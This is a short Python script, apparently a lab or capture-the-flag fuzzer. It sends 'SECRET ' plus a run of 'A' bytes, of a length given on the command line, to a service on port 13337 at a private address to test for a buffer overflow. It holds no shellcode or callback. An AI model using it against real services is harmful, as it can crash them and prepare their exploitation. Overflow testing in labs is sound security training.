#!/usr/bin/python3
import sys
import socket
nums= int(sys.argv[1])
buffer = b"A" * nums
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('192.168.80.130', 13337))
sock.recv(1024)
payload = b'SECRET ' + buffer
sock.send(payload)
sock.recv(1024)
